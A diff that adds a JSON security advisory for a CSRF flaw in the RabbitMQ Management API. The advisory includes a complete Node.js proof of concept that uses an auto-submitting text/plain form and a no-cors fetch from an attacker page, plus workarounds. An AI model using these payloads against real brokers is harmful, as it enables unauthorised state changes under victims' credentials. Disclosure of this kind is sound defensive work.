@@ -1,0 +1,77 @@
+{
+  "schema_version": "1.8.0",
+  "id": "DHI-kooz-wodr-vx3x-plqo",
+  "modified": "2026-11-27T12:09:54Z",
+  "published": "2026-11-27T12:09:54Z",
+  "upstream": [
+    "GHSA-c22p-g5xq-x5jm"
+  ],
+  "summary": "### Summary",
+  "details": "### Summary\r\n\r\nThe RabbitMQ Management API is vulnerable to Cross-Site Request Forgery (CSRF). Because the API authenticates requests using HTTP Basic authentication without enforcing anti-CSRF tokens, and because state-mutating endpoints accept requests with a text/plain Content-Type, an attacker can bypass CORS preflight protections. This allows a malicious third-party website to execute unauthorized state-changing actions (such as publishing or consuming messages) on behalf of an authenticated user.\r\n\r\n### Details\r\n\r\nThe Management API relies exclusively on HTTP Basic authentication and lacks any anti-CSRF token mechanisms. While CORS defenses are strictly configured to prevent unauthorized cross-origin reading and unauthorized preflight interactions, they do not block standard HTML <form> submissions or fetch requests initiated with mode: \"no-cors\" and simple headers.\r\nFurthermore, state-mutating routes, such as POST /api/exchanges/%2F/amq.default/publish, fail to strictly enforce an application/json Content-Type. Testing on rabbitmq:4-management (version 4.4.0) demonstrates that the API successfully parses and processes payloads sent with Content-Type: text/plain or missing content-type headers entirely. An attacker can craft a cross-site HTML form where the default = delimiter used by the browser is embedded harmlessly within a valid JSON string structure, forcing the broker to execute the request under the victim's cached credentials.\r\n\r\n### Proof of concept\r\n\r\nCopy the code below inside a file .mjs, and run it following the \r\n\r\n#!/usr/bin/env node\r\n// a cross-site form publishes through the management API with cached Basic\r\n// credentials.\r\n//\r\n// Chrome runs headless with a real profile. The setup navigation answers the Basic\r\n// challenge through CDP `Fetch.authRequired`, which caches the credentials for the\r\n// API origin; the attacker page on another origin then fires two vectors, each at\r\n// its own queue:\r\n//\r\n//   fetch(mode:\"no-cors\", credentials:\"include\")  -> publishes (cached credentials apply)\r\n//   <form enctype=\"text/plain\" target=_top>       -> publishes, and needs no JS\r\n//\r\n//   RABBIT_API=http://127.0.0.1:15672 node poc.mjs\r\n//\r\n// Exit 0 = the form vector published (finding reproduced); 2 = it did not.\r\nimport { spawn } from \"node:child_process\";\r\nimport { createServer } from \"node:http\";\r\nimport { mkdtempSync } from \"node:fs\";\r\nimport { tmpdir } from \"node:os\";\r\nimport { join } from \"node:path\";\r\n\r\nconst API = process.env.RABBIT_API ?? \"http://127.0.0.1:15672\";\r\nconst USER = process.env.RABBIT_USER ?? \"csrf\";\r\nconst PASS = process.env.RABBIT_PASS ?? \"csrf-pass\";\r\nconst CHROME = process.env.CHROME ?? \"google-chrome\";\r\nconst ATTACK_PORT = Number(process.env.POC_ATTACK_PORT ?? 8123);\r\nconst DEBUG_PORT = Number(process.env.POC_DEBUG_PORT ?? 9336);\r\nconst QUEUES = { fetch: \"poc-csrf-fetch\", form: \"poc-csrf-form\" };\r\n\r\nconst auth = \"Basic \" + Buffer.from(`${USER}:${PASS}`).toString(\"base64\");\r\nconst publish = `${API}/api/exchanges/%2F/amq.default/publish`;\r\n\r\nasync function api(method, path, body) {\r\n  return fetch(API + path, {\r\n    method,\r\n    headers: {\r\n      Authorization: auth,\r\n      ...(body === undefined ? {} : { \"Content-Type\": \"application/json\" }),\r\n    },\r\n    body: body === undefined ? undefined : JSON.stringify(body),\r\n  });\r\n}\r\n\r\nfor (const queue of Object.values(QUEUES)) {\r\n  const response = await api(\"PUT\", `/api/queues/%2F/${queue}`, {\r\n    durable: true,\r\n    auto_delete: false,\r\n    arguments: {},\r\n  });\r\n  if (![201, 204].includes(response.status)) {\r\n    console.error(`cannot create ${queue}: HTTP ${response.status} ${await response.text()}`);\r\n    process.exit(2);\r\n  }\r\n}\r\n\r\n// One vector per page, or the two would both publish into the same queue and the\r\n// counts would stop meaning anything.\r\nconst page = (mode) => {\r\n  const queue = mode === \"form\" ? QUEUES.form : QUEUES.fetch;\r\n  const form = mode === \"form\" ? `\r\n<form id=\"f\" method=\"POST\" target=\"_top\" action=\"${publish}\" enctype=\"text/plain\">\r\n  <input name='{\"properties\":{},\"routing_key\":\"${queue}\",\"payload\":\"a=' value='\",\"payload_encoding\":\"string\"}'>\r\n</form>\r\n<script>setTimeout(() => document.getElementById(\"f\").submit(), 150);</script>` : \"\";\r\n  const fetchScript = mode === \"fetch\" ? `<script>\r\nwindow.__probe = {};\r\nconst body = JSON.stringify({properties:{}, routing_key:\"${queue}\",\r\n                            payload:\"poc-fetch\", payload_encoding:\"string\"});\r\nfetch(\"${publish}\", {method:\"POST\", mode:\"no-cors\", credentials:\"include\",\r\n                     headers:{\"Content-Type\":\"text/plain\"}, body})\r\n  .then(r => { window.__probe.fetch = \"resolved type=\" + r.type; })\r\n  .catch(e => { window.__probe.fetch = \"rejected \" + e.message; });\r\n</script>` : \"\";\r\n  return `<!doctype html><meta charset=utf-8><title>poc</title>${form}${fetchScript}`;\r\n};\r\n\r\nconst attacker = createServer((request, response) => {\r\n  const mode = new URL(request.url, \"http://x\").searchParams.get(\"mode\") === \"form\"\r\n    ? \"form\"\r\n    : \"fetch\";\r\n  response.writeHead(200, { \"Content-Type\": \"text/html; charset=utf-8\" });\r\n  response.end(page(mode));\r\n});\r\nawait new Promise((resolve) => attacker.listen(ATTACK_PORT, \"127.0.0.1\", resolve));\r\n\r\nconst profile = mkdtempSync(join(tmpdir(), \"poc-csrf-\"));\r\nconst chrome = spawn(CHROME, [\r\n  \"--headless=new\",\r\n  `--remote-debugging-port=${DEBUG_PORT}`,\r\n  `--user-data-dir=${profile}`,\r\n  \"--no-first-run\",\r\n  \"--no-default-browser-check\",\r\n  \"--disable-gpu\",\r\n  \"--no-sandbox\",\r\n  \"about:blank\",\r\n], { stdio: \"ignore\" });\r\n\r\nasync function versionInfo() {\r\n  for (let attempt = 0; attempt < 80; attempt += 1) {\r\n    try {\r\n      const response = await fetch(`http://127.0.0.1:${DEBUG_PORT}/json/version`);\r\n      if (response.ok) return response.json();\r\n    } catch {}\r\n    await new Promise((resolve) => setTimeout(resolve, 250));\r\n  }\r\n  throw new Error(\"chrome did not expose the debugging port\");\r\n}\r\n\r\nconst info = await versionInfo();\r\nconst socket = new WebSocket(info.webSocketDebuggerUrl);\r\nawait new Promise((resolve, reject) => {\r\n  socket.onopen = resolve;\r\n  socket.onerror = reject;\r\n});\r\n\r\nlet nextId = 1;\r\nconst pending = new Map();\r\nconst events = [];\r\nsocket.onmessage = (event) => {\r\n  const message = JSON.parse(event.data);\r\n  if (message.id !== undefined) {\r\n    const entry = pending.get(message.id);\r\n    if (!entry) return;\r\n    pending.delete(message.id);\r\n    if (message.error) entry.reject(new Error(JSON.stringify(message.error)));\r\n    else entry.resolve(message.result);\r\n    return;\r\n  }\r\n  events.push(message);\r\n  if (message.method === \"Fetch.requestPaused\") {\r\n    send(\"Fetch.continueRequest\", { requestId: message.params.requestId }, message.sessionId);\r\n  } else if (message.method === \"Fetch.authRequired\") {\r\n    const seen = events.filter((entry) => entry.method === \"Fetch.authRequired\").length;\r\n    send(\"Fetch.continueWithAuth\", {\r\n      requestId: message.params.requestId,\r\n      authChallengeResponse: seen === 1\r\n        ? { response: \"ProvideCredentials\", username: USER, password: PASS }\r\n        : { response: \"CancelAuth\" },\r\n    }, message.sessionId);\r\n  }\r\n};\r\n\r\nfunction send(method, params = {}, sessionId) {\r\n  const id = nextId++;\r\n  socket.send(JSON.stringify({ id, method, params, ...(sessionId ? { sessionId } : {}) }));\r\n  return new Promise((resolve, reject) => pending.set(id, { resolve, reject }));\r\n}\r\n\r\nconst { targetId } = await send(\"Target.createTarget\", { url: \"about:blank\" });\r\nconst { sessionId } = await send(\"Target.attachToTarget\", { targetId, flatten: true });\r\nawait send(\"Page.enable\", {}, sessionId);\r\nawait send(\"Runtime.enable\", {}, sessionId);\r\nawait send(\"Fetch.enable\", {\r\n  patterns: [{ urlPattern: `${API}/*`, requestStage: \"Request\" }],\r\n  handleAuthRequests: true,\r\n}, sessionId);\r\n\r\n// 1. Cache the credentials with a navigation the browser answers through CDP.\r\nawait send(\"Page.navigate\", { url: `${API}/api/overview` }, sessionId);\r\nawait new Promise((resolve) => setTimeout(resolve, 2500));\r\n\r\nconst messages = async (queue) => {\r\n  const response = await api(\"GET\", `/api/queues/%2F/${queue}`);\r\n  const body = await response.json();\r\n  return body.messages ?? body.error ?? body;\r\n};\r\n\r\n// The management API serves queue lengths from periodic stats: a publish that just\r\n// happened is not visible in `messages` for a few seconds. Poll instead of reading\r\n// once, or a successful attack would be reported as a failure.\r\nconst waitForMessages = async (queue, timeoutMs = 20000) => {\r\n  const deadline = Date.now() + timeoutMs;\r\n  let value = 0;\r\n  do {\r\n    value = await messages(queue);\r\n    if (typeof value === \"number\" && value >= 1) return value;\r\n    await new Promise((resolve) => setTimeout(resolve, 500));\r\n  } while (Date.now() < deadline);\r\n  return value;\r\n};\r\n\r\nconst evaluate = async (expression) => {\r\n  const result = await send(\"Runtime.evaluate\",\r\n    { expression, returnByValue: true }, sessionId);\r\n  return result.result.value;\r\n};\r\n\r\n// 2. Fetch vector.\r\nawait send(\"Page.navigate\", { url: `http://127.0.0.1:${ATTACK_PORT}/?mode=fetch` }, sessionId);\r\nawait new Promise((resolve) => setTimeout(resolve, 3000));\r\nconst fetchProbe = await evaluate(\"JSON.stringify(window.__probe || {})\");\r\nconst fetchMessages = await waitForMessages(QUEUES.fetch);\r\n\r\n// 3. Form vector: a top-level POST that replaces the page with the API response.\r\nawait send(\"Page.navigate\", { url: `http://127.0.0.1:${ATTACK_PORT}/?mode=form` }, sessionId);\r\nawait new Promise((resolve) => setTimeout(resolve, 3500));\r\nconst formResponse = await evaluate(\"document.body ? document.body.innerText.slice(0, 120) : ''\");\r\nconst formMessages = await waitForMessages(QUEUES.form);\r\n\r\nconst challenges = events.filter((entry) => entry.method === \"Fetch.authRequired\").length;\r\nconsole.log(JSON.stringify({\r\n  chrome: info.Browser,\r\n  authChallenges: challenges,\r\n  fetch: { probe: fetchProbe, messages: fetchMessages },\r\n  form: { response: formResponse, messages: formMessages },\r\n}, null, 2));\r\n\r\nsocket.close();\r\nchrome.kill(\"SIGKILL\");\r\nawait new Promise((resolve) => attacker.close(resolve));\r\nfor (const queue of Object.values(QUEUES)) {\r\n  await api(\"DELETE\", `/api/queues/%2F/${queue}`);\r\n}\r\n\r\nif (formMessages >= 1) {\r\n  console.log(\"\\nREPRODUCED: the cross-site form published a message (R-05).\");\r\n  process.exit(0);\r\n}\r\nconsole.log(\"\\nNOT REPRODUCED: the form did not publish.\");\r\nprocess.exit(2);\r\n\r\n\r\n\r\n### Impact\r\n\r\nThis vulnerability allows for a blind Cross-Site Request Forgery (CSRF) attack that yields real-world, unauthorized manipulation of the broker's state. By exploiting the lack of anti-CSRF defenses and the interpretation conflict of the text/plain Content-Type, a malicious third-party website can hijack an authenticated user's session to execute certain actions, including administrative\r\nactions if the affected user has the sufficient privileges.\r\n\r\n## Workarounds\r\n\r\n### Limit HTTP API and Management UI Acces to HTTPS\r\n\r\n[Using HTTPS](https://www.rabbitmq.com/docs/management#single-listener-https) exclusively\r\nfor management UI and HTTP API access is arguably the baseline scenario these days.\r\n\r\n### Use JWTs Exclusively\r\n\r\nBasic HTTP API can be disabled entirely:\r\n\r\n```ini\r\nmanagement.disable_basic_auth = true\r\n```\r\n\r\nin favor of OAuth 2.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Debian:13",
+        "name": "rabbitmq-4.3",
+        "purl": "pkg:deb/dhi/rabbitmq-4.3"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "4.3.5-0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "4.3.5-0",
+        "4.3.5-1",
+        "4.3.6-0",
+        "4.3.6-1",
+        "4.3.6-2"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Debian:13",
+        "name": "rabbitmq-4.4",
+        "purl": "pkg:deb/dhi/rabbitmq-4.4"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "4.4.0-0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "4.4.0-0",
+        "4.4.1-0",
+        "4.4.1-1",
+        "4.4.1-2",
+        "4.4.1-3"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://scout.docker.com/v/DHI-kooz-wodr-vx3x-plqo"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/rabbitmq/rabbitmq-server/security/advisories/GHSA-c22p-g5xq-x5jm"
+    }
+  ]
+}
